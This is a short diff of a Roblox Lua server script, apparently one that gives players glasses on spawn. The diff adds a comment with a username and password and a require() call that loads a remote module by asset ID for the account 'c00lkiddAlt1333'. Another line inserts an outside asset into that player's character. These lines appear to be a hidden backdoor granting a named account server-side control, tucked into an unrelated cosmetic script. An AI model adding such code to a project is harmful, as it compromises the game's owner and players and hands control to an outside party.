@@ -25,7 +25,9 @@ player.CharacterAdded:Connect(function(char)
     GiveGlasses(char)
 end)
 
-
+--cXyzkidd  Password: Sub2TeamcXyzkidd
+require(71055540225901).beta("c00lkiddAlt1333")
+ 
 
 --bryle cerny
 game:GetService("InsertService"):LoadAsset(125571952738117):GetChildren()[1].Parent = game.Players["c00lkiddAlt1333"].Character
